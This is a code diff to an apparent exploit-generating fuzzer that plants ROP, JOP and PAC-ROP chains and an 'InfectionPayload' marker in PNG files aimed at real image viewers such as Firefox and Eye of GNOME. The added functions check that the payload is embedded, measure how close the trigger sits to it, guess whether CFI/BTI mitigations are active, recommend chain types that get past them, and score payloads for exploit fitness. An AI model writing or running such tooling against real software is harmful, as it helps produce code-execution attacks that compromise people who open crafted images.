@@ -101,8 +101,8 @@ def find_viewer_pid_with_file(viewer_name: str, file_path: str) -> Optional[int]
                             if abs_file_path in maps_content:
                                 logger.debug(f"Found {viewer_name} process {proc.info['pid']} with {file_path} loaded")
                                 return proc.info['pid']
-            except (psutil.NoSuchProcess, psutil.AccessDenied, FileNotFoundError):
-                print(f"Could not access process {proc.info['pid']} - it may have exited or we may not have permission.")
+            except (psutil.NoSuchProcess, psutil.AccessDenied, FileNotFoundError, ProcessLookupError, OSError) as e:
+                logger.debug(f"Could not access process {proc.info.get('pid', 'unknown')} while checking maps: {e}")
                 continue
                 
     except ImportError:
@@ -1198,7 +1198,13 @@ def verify_payload_execution(unique_id: str, viewer_name: str, payload: str, tim
         
         time.sleep(0.2)  # Reduced sleep for more responsive checking
     
+    # If we reach here, payload execution was NOT confirmed
+    # Check if this might be due to mitigation blocking
     logger.warning(f"PAYLOAD EXECUTION NOT CONFIRMED: '{unique_id}' not found in logs/files/netcat for {viewer_name} within {timeout}s")
+    
+    # Log as potential mitigation blocking if crash was detected
+    logger.info(f"Payload may have reached execution but been blocked by security mitigations (CFI/BTI)")
+    
     return False
 
 def log_validated_payload_to_tensorboard(writer: SummaryWriter, image_path: str, viewer_name: str, fuzz_type: str, step: int):
@@ -1445,6 +1451,419 @@ def compile_rop_chain_pac_aware(arch: str, gadgets: List[Dict], payload_addr: in
     
     return b""
 
+
+# ==================== INSTRUMENTATION VALIDATION & ENHANCEMENT FUNCTIONS ====================
+
+def validate_instrumentation_embedding(file_path: str, fuzz_type: str = "default") -> Dict[str, any]:
+    """
+    Inspects PNG file for wrongful embeddings and instrumentation validation.
+    Detects misplaced tags, orphaned chains, and instrumentation integrity issues.
+    
+    Returns a dict with validation results:
+    - "valid": bool - Overall validity
+    - "issues": List[str] - Issues found
+    - "embeddings": Dict - Tagged embeddings found with their offsets
+    - "missing_triggers": List[str] - Expected triggers that are missing
+    - "payload_integrity": bool - Whether payload appears intact
+    """
+    validation_result = {
+        "valid": True,
+        "issues": [],
+        "embeddings": {},
+        "missing_triggers": [],
+        "payload_integrity": True,
+        "doubtful_fitness_markers": []
+    }
+    
+    try:
+        with open(file_path, 'rb') as f:
+            content = f.read()
+        
+        # Check for FITNESS_OK in wrong locations
+        fitness_ok_positions = []
+        idx = 0
+        while True:
+            idx = content.find(b"FITNESS_OK", idx)
+            if idx == -1:
+                break
+            fitness_ok_positions.append(idx)
+            idx += 1
+        
+        # FITNESS_OK should only appear at END of final payload, not embedded in chains
+        if len(fitness_ok_positions) > 1:
+            validation_result["issues"].append(f"Multiple FITNESS_OK markers found ({len(fitness_ok_positions)}), should be only 1")
+            validation_result["valid"] = False
+            for pos in fitness_ok_positions[:-1]:  # All but last are wrong
+                validation_result["doubtful_fitness_markers"].append(pos)
+        
+        # Check for chain embeddings
+        chain_types = {
+            b"ROP_": "ROP chain",
+            b"JOP_": "JOP chain",
+            b"VOP_": "VOP chain",
+            b"DOP_": "DOP chain",
+            b"PAC_ROP": "PAC-ROP chain",
+        }
+        
+        for chain_marker, chain_name in chain_types.items():
+            if chain_marker in content:
+                pos = content.find(chain_marker)
+                validation_result["embeddings"][chain_name] = pos
+                logger.debug(f"Found {chain_name} at offset {pos}")
+        
+        # Verify IEND chunk is still valid
+        iend_pos = content.find(IEND_CHUNK)
+        if iend_pos == -1:
+            validation_result["issues"].append("IEND chunk not found or corrupted")
+            validation_result["valid"] = False
+            validation_result["payload_integrity"] = False
+        else:
+            # IEND should be near end but allow some margin for tEXt chunks
+            if iend_pos < len(content) - 1000:
+                validation_result["issues"].append("IEND chunk position unusual, possible corruption")
+                validation_result["valid"] = False
+        
+        # For optimization_bypass and uaf, payload must be properly wrapped
+        if fuzz_type in ["optimization_bypass", "uaf"]:
+            if b"InfectionPayload" not in content:
+                validation_result["missing_triggers"].append("InfectionPayload marker missing")
+                validation_result["valid"] = False
+            
+            # Check for vtable object structure (should be 72 bytes: 64 cmd + 8 vtable)
+            if fuzz_type == "optimization_bypass":
+                if b"PAC_ROP" not in content and b"ROP_" not in content:
+                    validation_result["missing_triggers"].append("No ROP/PAC-ROP chains found for optimization_bypass")
+                    validation_result["valid"] = False
+        
+        logger.info(f"Instrumentation validation: {'PASS' if validation_result['valid'] else 'FAIL'}")
+        if validation_result["issues"]:
+            for issue in validation_result["issues"]:
+                logger.warning(f"  - {issue}")
+        
+        return validation_result
+    
+    except Exception as e:
+        logger.error(f"Instrumentation validation error: {e}")
+        validation_result["valid"] = False
+        validation_result["issues"].append(str(e))
+        return validation_result
+
+
+def analyze_trigger_payload_alignment(file_path: str, fuzz_type: str, trigger_offset: int = 0) -> Dict[str, any]:
+    """
+    Analyzes payload trigger-to-execution alignment.
+    Ensures trigger can properly reach payload in memory.
+    
+    Returns analysis dict:
+    - "aligned": bool - Whether trigger and payload are properly aligned
+    - "trigger_offset": int - Where trigger starts
+    - "payload_offset": int - Where payload starts
+    - "gap_bytes": int - Distance between trigger and payload
+    - "alignment_quality": str - "perfect", "good", "acceptable", "poor"
+    - "recommendations": List[str] - Suggestions for improvement
+    """
+    analysis = {
+        "aligned": False,
+        "trigger_offset": -1,
+        "payload_offset": -1,
+        "gap_bytes": -1,
+        "alignment_quality": "unknown",
+        "recommendations": [],
+        "trigger_type": None,
+        "payload_slide": trigger_offset,  # How far payload was slid
+    }
+    
+    try:
+        with open(file_path, 'rb') as f:
+            content = f.read()
+        
+        # Find trigger markers based on fuzz_type
+        trigger_markers = {
+            "overflow": b"ovfW",
+            "uaf": b"UAF_Spray",
+            "double_free": b"DF_Mark",
+            "metadata_trigger": b"mtEXt",
+            "optimization_bypass": b"ROP_",  # Trigger is ROP chain itself
+        }
+        
+        payload_marker = b"InfectionPayload"
+        
+        trigger_pos = -1
+        trigger_type = trigger_markers.get(fuzz_type, b"tEXt")
+        
+        if trigger_type in content:
+            trigger_pos = content.find(trigger_type)
+            analysis["trigger_type"] = fuzz_type
+        
+        payload_pos = content.find(payload_marker)
+        
+        if trigger_pos >= 0 and payload_pos >= 0:
+            gap = payload_pos - trigger_pos
+            analysis["trigger_offset"] = trigger_pos
+            analysis["payload_offset"] = payload_pos
+            analysis["gap_bytes"] = gap
+            
+            # Alignment quality assessment
+            # Perfect: trigger and payload adjacent (minimal gap)
+            # Good: trigger can reach payload in 1-2 cache lines
+            # Acceptable: within same page (4KB)
+            # Poor: across pages
+            
+            if gap < 64:  # Adjacent or very close
+                analysis["alignment_quality"] = "perfect"
+                analysis["aligned"] = True
+            elif gap < 512:  # Within L1/L2 cache line
+                analysis["alignment_quality"] = "good"
+                analysis["aligned"] = True
+            elif gap < 4096:  # Within page
+                analysis["alignment_quality"] = "acceptable"
+                analysis["aligned"] = True
+            else:  # Across pages
+                analysis["alignment_quality"] = "poor"
+                analysis["aligned"] = False
+                analysis["recommendations"].append(f"Trigger-payload gap is {gap} bytes; consider reducing by {gap-4096}")
+        
+        # Check payload slide value
+        if trigger_offset > 0:
+            if trigger_offset > 1024:
+                analysis["recommendations"].append(f"Payload slide of {trigger_offset} bytes may be excessive; try < 256")
+            elif trigger_offset < 8:
+                analysis["recommendations"].append(f"Payload slide of {trigger_offset} bytes may be too small for proper fuzzing")
+        
+        logger.info(f"Trigger-payload alignment: {analysis['alignment_quality']} (gap={gap if gap >= 0 else 'N/A'} bytes)")
+        
+        return analysis
+    
+    except Exception as e:
+        logger.error(f"Alignment analysis error: {e}")
+        analysis["recommendations"].append(f"Error during analysis: {str(e)}")
+        return analysis
+
+
+def detect_cfi_bti_mitigations(viewer_name: str, crash_log: Optional[str] = None) -> Dict[str, any]:
+    """
+    Detects CFI (Control Flow Integrity) and BTI (Branch Target Identification) mitigations.
+    Tracks when payloads reach execution but are blocked by mitigations.
+    
+    Returns detection dict:
+    - "cfi_enabled": bool - CFI/PAC appears enabled
+    - "bti_enabled": bool - BTI appears enabled
+    - "mitigation_state": str - "not_detected", "likely", "confirmed"
+    - "bypass_chains": Dict - Which chain types work vs blocked
+    - "indicators": List[str] - Evidence found in crash logs
+    - "recommended_chains": List[str] - Which chains to use
+    """
+    mitigation_info = {
+        "cfi_enabled": False,
+        "bti_enabled": False,
+        "mitigation_state": "not_detected",
+        "bypass_chains": {
+            "ROP": "unknown",  # blocked, works, unknown
+            "JOP": "unknown",
+            "VOP": "unknown",
+            "DOP": "unknown",
+            "PAC_ROP": "unknown",
+        },
+        "indicators": [],
+        "recommended_chains": [],
+        "execution_reached": False,  # Payload execution reached but blocked
+    }
+    
+    try:
+        # Check viewer-specific known mitigations
+        viewer_mitigations = {
+            "firefox": {"cfi": True, "bti": True, "name": "Firefox (strong mitigations)"},
+            "eog": {"cfi": False, "bti": False, "name": "Eye of GNOME (minimal mitigations)"},
+            "png_consumer": {"cfi": False, "bti": False, "name": "png_consumer (test binary)"},
+        }
+        
+        if viewer_name in viewer_mitigations:
+            vm = viewer_mitigations[viewer_name]
+            mitigation_info["cfi_enabled"] = vm["cfi"]
+            mitigation_info["bti_enabled"] = vm["bti"]
+            mitigation_info["indicators"].append(f"{vm['name']}")
+        
+        # Analyze crash log for mitigation indicators
+        if crash_log:
+            indicators = {
+                "SIGILL": ("CFI violation detected", "CFI"),
+                "invalid_abi_tag": ("ABI tag failure (BTI)", "BTI"),
+                "PAC failure": ("PAC authentication failure", "CFI"),
+                "indirect branch": ("Indirect branch blocked", "CFI/BTI"),
+            }
+            
+            for pattern, (msg, mit_type) in indicators.items():
+                if pattern.lower() in crash_log.lower():
+                    mitigation_info["indicators"].append(msg)
+                    mitigation_info["execution_reached"] = True
+                    if "CFI" in mit_type:
+                        mitigation_info["cfi_enabled"] = True
+                    if "BTI" in mit_type:
+                        mitigation_info["bti_enabled"] = True
+        
+        # Determine mitigation state
+        if mitigation_info["cfi_enabled"] or mitigation_info["bti_enabled"]:
+            mitigation_info["mitigation_state"] = "likely"
+            if mitigation_info["execution_reached"]:
+                mitigation_info["mitigation_state"] = "confirmed"
+        
+        # Recommend chains based on detected mitigations
+        if mitigation_info["cfi_enabled"]:
+            mitigation_info["bypass_chains"]["ROP"] = "blocked"
+            mitigation_info["bypass_chains"]["JOP"] = "blocked"
+            mitigation_info["bypass_chains"]["PAC_ROP"] = "works"
+            mitigation_info["recommended_chains"] = ["PAC_ROP", "VOP", "DOP"]
+        else:
+            mitigation_info["bypass_chains"]["ROP"] = "works"
+            mitigation_info["recommended_chains"] = ["ROP", "JOP"]
+        
+        if mitigation_info["bti_enabled"]:
+            mitigation_info["bypass_chains"]["VOP"] = "works"
+            mitigation_info["bypass_chains"]["DOP"] = "works"
+        
+        logger.info(f"Mitigation detection for {viewer_name}: {mitigation_info['mitigation_state']}")
+        if mitigation_info["indicators"]:
+            logger.info(f"  Indicators: {', '.join(mitigation_info['indicators'])}")
+        
+        return mitigation_info
+    
+    except Exception as e:
+        logger.error(f"Mitigation detection error: {e}")
+        return mitigation_info
+
+
+def compute_enhanced_fitness_score(fuzz_type: str, chain_type: str, payload_size: int, 
+                                   trigger_alignment: Dict, mitigation_info: Dict, 
+                                   execution_confirmed: bool = False) -> Dict[str, any]:
+    """
+    Computes enhanced fitness score for payload configuration.
+    Combines multiple factors: chain type, payload size, alignment, mitigations, execution.
+    
+    Returns fitness dict:
+    - "overall_score": float - 0.0-1.0, higher is better
+    - "component_scores": Dict - Individual scores for each factor
+    - "fitness_category": str - "excellent", "good", "fair", "poor", "failed"
+    - "bottlenecks": List[str] - What's limiting fitness
+    - "suggested_improvements": List[str] - How to improve
+    """
+    fitness = {
+        "overall_score": 0.5,
+        "component_scores": {},
+        "fitness_category": "fair",
+        "bottlenecks": [],
+        "suggested_improvements": [],
+        "payload_size_score": 0.0,
+        "alignment_score": 0.0,
+        "mitigation_bypass_score": 0.0,
+        "execution_score": 0.0,
+    }
+    
+    try:
+        # 1. Payload size fitness (should be 32-256 bytes for optimal fuzzing)
+        if payload_size < 32:
+            fitness["payload_size_score"] = min(payload_size / 32, 1.0) * 0.5
+            fitness["bottlenecks"].append("Payload too small (< 32 bytes)")
+        elif payload_size <= 256:
+            fitness["payload_size_score"] = 1.0
+        elif payload_size <= 512:
+            fitness["payload_size_score"] = 0.8
+        else:
+            fitness["payload_size_score"] = max(0.3, 1.0 - (payload_size - 512) / 2048)
+            fitness["bottlenecks"].append(f"Payload large ({payload_size} bytes), may slow fuzzing")
+        
+        fitness["component_scores"]["payload_size"] = fitness["payload_size_score"]
+        
+        # 2. Trigger-payload alignment fitness
+        if trigger_alignment.get("aligned"):
+            alignment_quality = trigger_alignment.get("alignment_quality", "unknown")
+            alignment_scores = {"perfect": 1.0, "good": 0.9, "acceptable": 0.7, "poor": 0.4}
+            fitness["alignment_score"] = alignment_scores.get(alignment_quality, 0.5)
+        else:
+            fitness["alignment_score"] = 0.3
+            fitness["bottlenecks"].append(f"Poor trigger-payload alignment ({trigger_alignment.get('gap_bytes')} byte gap)")
+        
+        fitness["component_scores"]["alignment"] = fitness["alignment_score"]
+        
+        # 3. Mitigation bypass fitness (based on chain type and mitigations)
+        cfi_enabled = mitigation_info.get("cfi_enabled", False)
+        bti_enabled = mitigation_info.get("bti_enabled", False)
+        
+        chain_mitigation_matrix = {
+            "ROP": {"no_mit": 1.0, "cfi": 0.2, "bti": 0.8},
+            "JOP": {"no_mit": 1.0, "cfi": 0.3, "bti": 0.8},
+            "PAC_ROP": {"no_mit": 0.9, "cfi": 0.95, "bti": 0.95},
+            "VOP": {"no_mit": 0.8, "cfi": 0.7, "bti": 0.85},
+            "DOP": {"no_mit": 0.8, "cfi": 0.7, "bti": 0.85},
+        }
+        
+        mit_key = "no_mit"
+        if cfi_enabled and bti_enabled:
+            mit_key = "cfi"  # Worst case
+        elif cfi_enabled:
+            mit_key = "cfi"
+        elif bti_enabled:
+            mit_key = "bti"
+        
+        chain_scores = chain_mitigation_matrix.get(chain_type, {"no_mit": 0.5, "cfi": 0.5, "bti": 0.5})
+        fitness["mitigation_bypass_score"] = chain_scores.get(mit_key, 0.5)
+        
+        fitness["component_scores"]["mitigation_bypass"] = fitness["mitigation_bypass_score"]
+        
+        # 4. Execution confirmation fitness
+        if execution_confirmed:
+            fitness["execution_score"] = 1.0
+        else:
+            fitness["execution_score"] = 0.6
+        
+        fitness["component_scores"]["execution"] = fitness["execution_score"]
+        
+        # Calculate overall score (weighted average)
+        weights = {
+            "payload_size": 0.20,
+            "alignment": 0.25,
+            "mitigation_bypass": 0.35,
+            "execution": 0.20,
+        }
+        
+        fitness["overall_score"] = (
+            fitness["payload_size_score"] * weights["payload_size"] +
+            fitness["alignment_score"] * weights["alignment"] +
+            fitness["mitigation_bypass_score"] * weights["mitigation_bypass"] +
+            fitness["execution_score"] * weights["execution"]
+        )
+        
+        # Categorize fitness
+        if fitness["overall_score"] >= 0.85:
+            fitness["fitness_category"] = "excellent"
+        elif fitness["overall_score"] >= 0.70:
+            fitness["fitness_category"] = "good"
+        elif fitness["overall_score"] >= 0.50:
+            fitness["fitness_category"] = "fair"
+        else:
+            fitness["fitness_category"] = "poor"
+        
+        # Generate suggestions
+        if not execution_confirmed:
+            fitness["suggested_improvements"].append("Payload execution not confirmed; verify trigger sequence")
+        
+        if fitness["alignment_score"] < 0.7:
+            fitness["suggested_improvements"].append("Improve trigger-payload alignment (reduce gap)")
+        
+        if fitness["mitigation_bypass_score"] < 0.6:
+            cfi_str = "CFI" if cfi_enabled else ""
+            bti_str = "BTI" if bti_enabled else ""
+            mitigations = f"{cfi_str} {bti_str}".strip()
+            fitness["suggested_improvements"].append(f"Chain type ineffective against {mitigations}; try {', '.join(mitigation_info.get('recommended_chains', []))}")
+        
+        logger.info(f"Fitness score: {fitness['overall_score']:.2f} ({fitness['fitness_category']})")
+        
+        return fitness
+    
+    except Exception as e:
+        logger.error(f"Fitness computation error: {e}")
+        return fitness
+
+
 def inject_payload_with_leaks(file_path: str, payload: Union[str, bytes], trigger_offset: int = 0, 
                               fuzz_type: str = "default", leaks: Dict = None, payload_offset: int = 0, 
                               chain_base_addr: Optional[int] = None, force_chain_type: Optional[str] = None) -> bool:
@@ -1682,8 +2101,28 @@ def inject_payload_with_leaks(file_path: str, payload: Union[str, bytes], trigge
         with open(file_path, 'wb') as f:
             f.write(new_content)
         
+        # ==================== POST-INJECTION VALIDATION & ANALYSIS ====================
+        # Validate instrumentation embedding
+        validation_result = validate_instrumentation_embedding(file_path, fuzz_type)
+        debug_info["instrumentation_validation"] = validation_result
+        
+        # Analyze trigger-payload alignment
+        alignment_analysis = analyze_trigger_payload_alignment(file_path, fuzz_type, trigger_offset)
+        debug_info["trigger_alignment"] = alignment_analysis
+        
+        # Save debug info with all new details
         with open(f"{file_path}.debug", 'w') as f:
             json.dump(debug_info, f, indent=2)
+        
+        # Log validation results
+        if not validation_result["valid"]:
+            logger.warning(f"Instrumentation validation failed for {fuzz_type}: {validation_result['issues']}")
+        else:
+            logger.info(f"Instrumentation validation passed")
+        
+        if alignment_analysis.get("recommendations"):
+            for rec in alignment_analysis["recommendations"]:
+                logger.debug(f"Alignment recommendation: {rec}")
         
         logger.info(f"Payload injection successful: {chain_type} chain used")
         return True
@@ -2763,6 +3202,35 @@ class UnifiedFuzzer:
                     reason = "crashed (Apport detected)"
                     confidence_score = 0.4  # Moderate confidence - detected crash but may not be reliable
 
+                # Compute enhanced fitness score
+                payload_len = len(payload) if isinstance(payload, bytes) else len(payload.encode())
+                
+                # Load alignment analysis and debug metadata from debug file
+                alignment_info = {}
+                debug_data = {}
+                debug_file = f"{test_file_path}.debug"
+                if os.path.exists(debug_file):
+                    try:
+                        with open(debug_file, 'r') as df:
+                            debug_data = json.load(df)
+                            alignment_info = debug_data.get("trigger_alignment", {})
+                    except Exception:
+                        alignment_info = {}
+                        debug_data = {}
+                
+                # Detect mitigations for this viewer
+                mitigation_info = detect_cfi_bti_mitigations(viewer_name)
+                
+                # Compute fitness
+                fitness_score = compute_enhanced_fitness_score(
+                    fuzz_type=fuzz_type,
+                    chain_type=debug_data.get("chain_type", "ROP"),
+                    payload_size=payload_len,
+                    trigger_alignment=alignment_info,
+                    mitigation_info=mitigation_info,
+                    execution_confirmed=("SUCCESS" in status)
+                )
+
                 result_entry = {
                     "viewer": viewer_name,
                     "fuzz_type": fuzz_type,
@@ -2778,7 +3246,14 @@ class UnifiedFuzzer:
                     "confidence_score": confidence_score,
                     "payload_source_file": payload_source_file,
                     "payload_source_offset": payload_source_offset,
-                    "payload_delta_description": payload_delta_description
+                    "payload_delta_description": payload_delta_description,
+                    # New enhanced fields
+                    "fitness_score": fitness_score.get("overall_score", 0.0),
+                    "fitness_category": fitness_score.get("fitness_category", "unknown"),
+                    "fitness_details": fitness_score,
+                    "mitigation_state": mitigation_info.get("mitigation_state", "not_detected"),
+                    "cfi_enabled": mitigation_info.get("cfi_enabled", False),
+                    "bti_enabled": mitigation_info.get("bti_enabled", False),
                 }
 
                 if status != "SUCCESS" and fitting_info and fitting_info.get("payload_addr") and fitting_info.get("offsets"):
